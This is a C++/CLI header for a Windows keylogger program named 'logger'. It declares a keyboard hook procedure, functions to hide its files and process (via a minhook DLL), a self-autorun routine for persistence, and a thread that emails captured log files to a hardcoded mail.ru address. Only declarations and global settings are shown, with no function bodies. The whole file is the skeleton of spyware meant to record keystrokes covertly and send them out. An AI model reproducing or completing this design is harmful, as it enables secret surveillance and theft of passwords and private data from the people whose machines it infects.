#pragma once

#include <windows.h>
#include <cstring>
#include <fstream>
#include <iostream>
#include <algorithm>
#include <string>
#include <tchar.h>
#include <process.h>
#using <System.dll>

#define STRLENN(x) (sizeof(x)/sizeof(TCHAR) - 1)

using namespace System;
using namespace System::Diagnostics;
using namespace System::Net::Mail;
using namespace System::Net::Mime;
using namespace System::Threading;
using namespace System::ComponentModel;

char* GetCurPath(char *);

static bool mailSent;
static bool openFile;
static bool stopThreadSendMail = true;
static bool stopThreadHideProc = true;
static char nameProg[10] = "logger";
static char name[MAX_PATH] = "sysdat.log";
#if defined _M_X64
static char namedll[MAX_PATH] = "minhook.dll";
#elif defined _M_IX86
static char namedll[MAX_PATH] = "minhook32.dll";
#endif
static char namepostfile[MAX_PATH] = "topost.log";

ref struct Global {
	static System::String^ recPost = "testforname@mail.ru";
	static System::String^ nameComp = "comp";
};

static char* logName(GetCurPath(name));
static char* pathdll(GetCurPath(namedll));
static char* nPostFile(GetCurPath(namepostfile));

void hideFiles();
void toPostAnother(char*);
void msgLoop();
void getCompName();
unsigned _stdcall hideProc(void* pArguments);
unsigned _stdcall sendFileFun(void* pArguments);
static void SendCompletedCallback(Object^ sender, AsyncCompletedEventArgs^ e);
LRESULT CALLBACK hookProc(int nCode,WPARAM wParam, LPARAM lParam);
BOOL isCaps();
BOOL SelfAutorun();

